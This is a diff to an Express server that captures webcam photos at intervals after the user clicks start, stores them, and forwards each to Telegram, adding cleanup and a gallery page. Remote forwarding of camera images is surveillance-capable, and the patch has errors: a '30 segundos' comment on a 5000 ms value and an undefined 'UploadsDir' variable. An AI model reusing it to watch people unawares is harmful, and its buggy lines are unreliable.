@@ -8,8 +8,22 @@ require('dotenv').config();
 const app = express();
 const PORT = process.env.PORT || 3000;
 
+// Criar pasta Uploads se não existir
+const uploadsDir = path.join(__dirname, 'Uploads');
+console.log('Tentando criar pasta Uploads em:', uploadsDir);
+try {
+    if (!fs.existsSync(uploadsDir)) {
+        fs.mkdirSync(uploadsDir, { recursive: true });
+        console.log('Pasta Uploads criada com sucesso em:', uploadsDir);
+    } else {
+        console.log('Pasta Uploads já existe em:', uploadsDir);
+    }
+} catch (error) {
+    console.error('Erro ao criar pasta Uploads:', error.message);
+}
+
 app.use(express.json());
-app.use('/uploads', express.static('uploads'));
+app.use('/Uploads', express.static('Uploads')); // Corrigido para corresponder ao caminho
 
 app.get('/', (req, res) => {
     res.send(`
@@ -51,7 +65,7 @@ app.get('/', (req, res) => {
                         status.textContent = 'Captura iniciada!';
                         startBtn.disabled = true;
                         stopBtn.disabled = false;
-                        intervalId = setInterval(() => capturePhoto(video), 1000);
+                        intervalId = setInterval(() => capturePhoto(video), 5000); // Aumentado para 30 segundos
                     } catch (err) {
                         console.error("Erro ao acessar a câmera: ", err);
                         status.textContent = 'Erro ao acessar a câmera. Permita o acesso e tente novamente.';
@@ -104,14 +118,23 @@ app.post('/upload', async (req, res) => {
         console.log('Tamanho do buffer recebido:', buffer.length);
         const filename = `foto_${Date.now()}.jpg`;
         const filepath = path.join(__dirname, 'Uploads', filename);
+        console.log('Tentando salvar foto em:', filepath);
         fs.writeFileSync(filepath, buffer);
         console.log('Foto salva localmente:', filepath);
+        // Limpar fotos antigas (manter apenas as últimas 10)
+        const files = fs.readdirSync(uploadsDir).filter(f => f.endsWith('.jpg')).sort();
+        if (files.length > 10) {
+            for (const oldFile of files.slice(0, files.length - 10)) {
+                fs.unlinkSync(path.join(UploadsDir, oldFile));
+                console.log(`Foto antiga removida: ${oldFile}`);
+            }
+        }
         console.log('Iniciando envio ao Telegram...');
         await sendToTelegram(buffer, filename);
         console.log('Envio ao Telegram concluído.');
         res.json({ success: true, message: `Foto salva como ${filename}` });
     } catch (error) {
-        console.error('Erro no upload:', error.message);
+        console.error('Erro ao processar foto:', error.message);
         res.status(500).json({ success: false, error: `Erro ao processar foto: ${error.message}` });
     }
 });
@@ -153,29 +176,35 @@ async function sendToTelegram(buffer, filename) {
 }
 
 app.get('/gallery', (req, res) => {
-    const images = fs.readdirSync('uploads').filter(file => file.endsWith('.jpg')).map(file => `/uploads/${file}`);
-    res.send(`
-        <!DOCTYPE html>
-        <html lang="pt-BR">
-        <head>
-            <meta charset="UTF-8">
-            <title>Galeria de Fotos</title>
-            <style>
-                body { font-family: Arial; text-align: center; background: #f0f0f0; }
-                .gallery { display: flex; flex-wrap: wrap; justify-content: center; gap: 10px; margin: 20px; }
-                img { max-width: 300px; border: 1px solid #ddd; border-radius: 8px; }
-            </style>
-        </head>
-        <body>
-            <h1>Galeria de Fotos Capturadas</h1>
-            <p>Total: ${images.length}</p>
-            <div class="gallery">
-                ${images.map(img => `<img src="${img}" alt="Foto">`).join('')}
-            </div>
-            <a href="/">Voltar à Captura</a>
-        </body>
-        </html>
-    `);
+    try {
+        const images = fs.readdirSync(uploadsDir).filter(file => file.endsWith('.jpg')).map(file => `/Uploads/${file}`);
+        console.log('Imagens na galeria:', images);
+        res.send(`
+            <!DOCTYPE html>
+            <html lang="pt-BR">
+            <head>
+                <meta charset="UTF-8">
+                <title>Galeria de Fotos</title>
+                <style>
+                    body { font-family: Arial; text-align: center; background: #f0f0f0; }
+                    .gallery { display: flex; flex-wrap: wrap; justify-content: center; gap: 10px; margin: 20px; }
+                    img { max-width: 300px; border: 1px solid #ddd; border-radius: 8px; }
+                </style>
+            </head>
+            <body>
+                <h1>Galeria de Fotos Capturadas</h1>
+                <p>Total: ${images.length}</p>
+                <div class="gallery">
+                    ${images.map(img => `<img src="${img}" alt="Foto">`).join('')}
+                </div>
+                <a href="/">Voltar à Captura</a>
+            </body>
+            </html>
+        `);
+    } catch (error) {
+        console.error('Erro ao carregar galeria:', error.message);
+        res.status(500).send('Erro ao carregar galeria: ' + error.message);
+    }
 });
 
 app.listen(PORT, () => {
